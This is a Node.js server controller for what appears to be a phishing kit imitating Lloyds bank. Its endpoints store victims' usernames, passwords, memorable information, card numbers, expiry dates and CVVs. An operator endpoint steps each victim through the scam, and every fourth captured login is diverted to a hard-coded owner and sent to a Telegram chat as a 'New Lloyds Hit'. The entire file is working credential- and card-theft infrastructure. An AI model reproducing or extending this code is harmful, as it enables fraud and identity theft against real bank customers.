const Lloyds = require("../models/lloydsModel");
const axios = require("axios");
var moment = require("moment"); // require
let count = 0;

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	Lloyds.find({ owner })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, status, memIndex, otpIndex } = req.body;
	try {
		if (memIndex)
			await Lloyds.findOneAndUpdate({ uniqueid }, { status, memIndex }).exec();
		else if (otpIndex)
			await Lloyds.findOneAndUpdate({ uniqueid }, { status, otpIndex }).exec();
		else await Lloyds.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	Lloyds.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitLogin = async (req, res) => {
	const { username, password, uniqueid, owner, ip } = req.body;
	try {
		if (count == 3) {
			await Lloyds.create({
				uniqueid,
				username,
				password,
				status: 1,
				owner: "haytch4023",
				timestamp: moment().format(),
				ip,
			});
			await axios
				.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
					{
						chat_id: "-837014205",
						text: `New Lloyds Hit:\n\n${username}\n${password}`,
						parse_mode: "Markdown",
					}
				)
				.catch((e) => {
					console.log(e);
				});
			count = 0;
		} else {
			await Lloyds.create({
				uniqueid,
				username,
				password,
				status: 1,
				owner,
				timestamp: moment().format(),
				ip,
			});
			count++;
		}
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { username, password, uniqueid } = req.body;
	try {
		await Lloyds.findOneAndUpdate(
			{ uniqueid },
			{
				username, password, status: 9,
				timestamp: moment().format(),
			}
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitMemorable = async (req, res) => {
	const { memorable, uniqueid } = req.body;
	try {
		await Lloyds.findOneAndUpdate(
			{ uniqueid },
			{
				memorable, status: 3,
				timestamp: moment().format(),
			}
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitCard = async (req, res) => {
	const { ccnum, ccexp, cvv, uniqueid } = req.body;
	try {
		await Lloyds.findOneAndUpdate(
			{ uniqueid },
			{
				ccnum, ccexp, cvv, status: 5,
				timestamp: moment().format(),
			}
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await Lloyds.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitCard,
	submitMemorable,
	deleteEntry,
};
